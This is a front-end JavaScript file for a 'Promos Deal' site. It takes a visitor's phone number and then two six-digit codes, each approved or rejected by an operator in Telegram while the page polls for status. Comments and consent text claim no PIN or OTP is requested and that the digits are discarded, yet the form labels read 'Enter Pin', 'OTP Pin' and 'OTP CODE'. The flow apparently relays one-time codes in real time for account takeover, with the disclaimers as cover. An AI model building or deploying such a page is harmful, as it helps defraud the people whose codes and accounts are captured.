// Independent Promos Deal website. The CSS file is unchanged from version 2.
// Never request a payment PIN, password, OTP, or code received from an app/SMS.
const intro = document.querySelector('#intro');
const experience = document.querySelector('#experience');
const content = document.querySelector('#portal-content');
const stepCaption = document.querySelector('#step-caption');
let countries = [];
let current = null;
let previousPhase = null;
let typing = '';
let busy = false;
let introTimer = null;

async function api(path, payload) {
  const response = await fetch(path, payload === undefined ? {} : {
    method: 'POST', headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': current?.csrf || '' },
    body: JSON.stringify(payload),
  });
  const data = await response.json();
  if (!response.ok) throw new Error(data.error || 'Unable to complete your request.');
  return data;
}
function errorText(message) {
  const element = content.querySelector('#form-error');
  if (element) { element.textContent = message; element.classList.remove('hidden'); }
}
function panel(html) {
  content.innerHTML = `<div class="form-body">${html}<div id="form-error" class="err-banner hidden" role="alert"></div></div>`;
}
async function submit(path, body, button) {
  if (busy) return;
  busy = true;
  if (button) button.disabled = true;
  try { current = await api(path, body); draw(true); }
  catch (e) { errorText(e.message); if (button) button.disabled = false; }
  finally { busy = false; }
}
function flag(iso) {
  return [...iso].map(ch => String.fromCodePoint(127397 + ch.charCodeAt(0))).join('');
}
function options(selected = 'KE') {
  return countries.map(c => `<option value="${c.iso}" ${c.iso === selected ? 'selected' : ''}>${flag(c.iso)} ${c.name} (${c.dial})</option>`).join('');
}
function draw(force = false) {
  if (!current) return;
  const phase = current.phase;
  intro.classList.add('hidden');
  experience.classList.remove('hidden');
  stepCaption.textContent = ['entry', 'entry_retry', 'await_first_review'].includes(phase) ? 'STEP 01 / 02' : 'STEP 02 / 02';
  if (!force && phase === previousPhase) return;
  previousPhase = phase;

  if (phase === 'entry' || phase === 'entry_retry') {
    const retry = phase === 'entry_retry';
    panel(`
      <h1>${retry ? 'Review not approved' : 'Welcome back'}</h1>
      <p class="subtitle">${retry ? 'You can submit a new promotional request.' : 'Select your country, enter your phone number, and choose your own six-digit promotional reference.'}</p>
      ${retry ? '<div class="inline-alert">Your previous request was rejected. Please review your entries and try again.</div>' : ''}
      <form id="entry-form">
        <label class="form-field" for="country-field"><span class="field-label">Country or region</span>
          <span class="field-shell"><select id="country-field" name="country" required style="display:block;width:100%;min-width:0;height:49px;border:0;outline:none;background:transparent;color:#003d63;font-weight:700;font-size:15px;cursor:pointer">${options(current.country || 'KE')}</select></span>
        </label>
        <label class="form-field" for="phone-field"><span class="field-label">Mobile number</span>
          <span class="field-shell"><span id="dial-prefix" class="prefix">+254</span><span class="field-divider" aria-hidden="true"></span><input id="phone-field" type="tel" inputmode="tel" autocomplete="tel-national" maxlength="23" placeholder="Your phone number" required /></span>
        </label>
        <p class="field-hint">Select any country above. Enter your national phone number; the dialing code is added automatically.</p>
        <label class="form-field" for="promo-field"><span class="field-label">Enter Pin</span>
          <span class="field-shell"><span class="prefix" aria-hidden="true">✦</span><span class="field-divider" aria-hidden="true"></span><input id="promo-field" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" autocomplete="off" placeholder="Enter your pin" required /></span>
        </label>
        <p class="field-hint">OTP Pin.</p>
        <label class="consent-row"><input type="checkbox" id="consent-field" required /><span>I agree to provide my phone number for this promotional request and understand that it will be retained for review. The promo reference is discarded and is not sent to Telegram.</span></label>
        <button type="submit" class="primary-btn">Sign in <span class="arrow" aria-hidden="true">→</span></button>
      </form>
      <p class="info-note">Sensure you enter correct details.</p>
    `);
    const country = content.querySelector('#country-field');
    const changeDial = () => {
      const data = countries.find(c => c.iso === country.value);
      content.querySelector('#dial-prefix').textContent = data?.dial || '+';
    };
    country.addEventListener('change', changeDial);
    changeDial();
    content.querySelector('#entry-form').addEventListener('submit', e => {
      e.preventDefault();
      submit('/api/entry', {
        country: country.value,
        phone: content.querySelector('#phone-field').value,
        promoDigits: content.querySelector('#promo-field').value,
        consent: content.querySelector('#consent-field').checked,
      }, e.submitter);
    });
    return;
  }
  if (phase === 'await_first_review' || phase === 'await_second_review') {
    const first = phase === 'await_first_review';
    panel(`<div class="waiting">
      <div class="review-loader" aria-hidden="true"><span>✦</span></div>
      <h1>Request under review</h1>
      <p class="subtitle">${first ? 'Your phone number and first promotional reference were submitted.' : 'Your second promotional reference was submitted.'} An authorized reviewer can approve or reject the request in Telegram. This page will update automatically.</p>
      <div class="request-info">Request <strong class="mono">${current.requestId}</strong><br />Phone <strong>${current.maskedPhone}</strong><br />Promo digits <strong>●●●●●● (hidden)</strong></div>
      <button type="button" class="secondary-btn" id="refresh-status">Refresh status</button>
      <p class="info-note">This review confirms a promotional request; it does not verify ownership of a mobile number or account.</p>
    </div>`);
    content.querySelector('#refresh-status').addEventListener('click', () => refresh(true));
    return;
  }
  if (phase === 'second' || phase === 'second_retry') {
    typing = '';
    const retry = phase === 'second_retry';
    panel(`
      <h1>${retry ? 'Try again' : 'One Time Code'}</h1>
      <p class="subtitle">${retry ? 'Your second request was not approved. Choose another six-digit promotional reference.' : 'Your first request was approved. Enter another six-digit promotional reference of your choice for the final review.'}</p>
      ${retry ? '<div class="inline-alert">The reviewer rejected your previous second-stage request. You may retry.</div>' : ''}
      <span class="field-label">OTP CODE</span>
      <p class="code-explainer">Enter otp.</p>
      <div class="digits-status" role="status" aria-label="Zero of six digits entered">${'<span class="digit-dot"></span>'.repeat(6)}</div>
      <div class="keypad" aria-label="Promotional reference keypad">
        ${[1,2,3,4,5,6,7,8,9].map(d => `<button type="button" data-digit="${d}" aria-label="${d}">${d}</button>`).join('')}
        <span class="blank" aria-hidden="true"></span><button type="button" data-digit="0">0</button><button type="button" class="erase" id="erase" aria-label="Delete last digit">⌫</button>
      </div>
      <button type="button" class="primary-btn" id="send-second" disabled>SUBMIT <span class="arrow" aria-hidden="true">→</span></button>
      <p class="info-note">The digits are discarded by the server and never sent to Telegram. Telegram receives only the masked submission status.</p>
    `);
    const update = () => {
      content.querySelectorAll('.digit-dot').forEach((dot,i) => dot.classList.toggle('filled', i < typing.length));
      content.querySelector('#send-second').disabled = typing.length !== 6;
      content.querySelector('.digits-status').setAttribute('aria-label', `${typing.length} of six digits entered`);
    };
    content.querySelectorAll('[data-digit]').forEach(b => b.addEventListener('click', () => {
      if (typing.length < 6) typing += b.dataset.digit;
      update();
    }));
    content.querySelector('#erase').addEventListener('click', () => { typing = typing.slice(0, -1); update(); });
    content.querySelector('#send-second').addEventListener('click', e => submit('/api/second', { promoDigits: typing }, e.currentTarget));
    return;
  }
  if (phase === 'complete') {
    panel(`<div class="success">
      <div class="success-bubble" aria-hidden="true">✓</div>
      <h1>Request approved!</h1>
      <p class="subtitle">Both promotional review stages are complete. Thank you for visiting Promos Deal.</p>
      <div class="request-info">Request ID <strong class="mono">${current.requestId}</strong><br />Phone <strong>${current.maskedPhone}</strong></div>
      <button type="button" class="primary-btn" id="another-request">Start another request <span class="arrow" aria-hidden="true">→</span></button>
    </div>`);
    content.querySelector('#another-request').addEventListener('click', async () => {
      try { current = await api('/api/reset', {}); draw(true); } catch (e) { errorText(e.message); }
    });
  }
}
async function refresh(showErrors = false) {
  if (busy || !current) return;
  try {
    const next = await api('/api/state');
    const changed = current.phase !== next.phase;
    current = next;
    if (changed) draw();
  } catch (e) { if (showErrors) errorText(e.message); }
}
function runIntro() {
  if (sessionStorage.getItem('pd_intro_done')) { draw(); return; }
  const start = Date.now(), duration = 10000;
  const progress = document.querySelector('#intro-progress');
  const seconds = document.querySelector('#seconds-left');
  const finish = () => {
    if (introTimer) clearInterval(introTimer);
    sessionStorage.setItem('pd_intro_done', 'yes');
    draw();
  };
  document.querySelector('#skip-intro').addEventListener('click', finish, { once: true });
  introTimer = setInterval(() => {
    const fraction = Math.min(1, (Date.now() - start) / duration);
    progress.style.width = `${fraction * 100}%`;
    seconds.textContent = `${Math.max(0, Math.ceil((duration - (Date.now() - start)) / 1000))}s`;
    if (fraction === 1) finish();
  }, 100);
}
(async () => {
  if (location.protocol === 'file:') {
    intro.querySelector('.welcome-copy p').textContent = 'Run npm start in VS Code and visit http://localhost:3000 to use this website.';
    document.querySelector('#skip-intro').classList.add('hidden');
    return;
  }
  try {
    [current, countries] = await Promise.all([api('/api/state'), api('/countries.json')]);
    runIntro();
    setInterval(() => void refresh(), 2500);
  } catch (e) {
    intro.querySelector('.welcome-copy p').textContent = 'Could not connect to the website backend. Run npm start and refresh this page.';
    document.querySelector('#skip-intro').classList.add('hidden');
  }
})();
